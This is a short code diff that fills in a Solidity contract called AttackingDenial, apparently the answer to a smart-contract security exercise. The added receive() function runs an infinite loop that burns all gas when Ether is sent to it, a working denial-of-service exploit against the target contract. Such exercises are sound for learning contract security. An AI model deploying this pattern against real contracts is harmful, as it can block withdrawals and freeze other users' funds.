@@ -9,5 +9,8 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        console.log("receive() function called!");
+        while(true) {}
+    }
 }
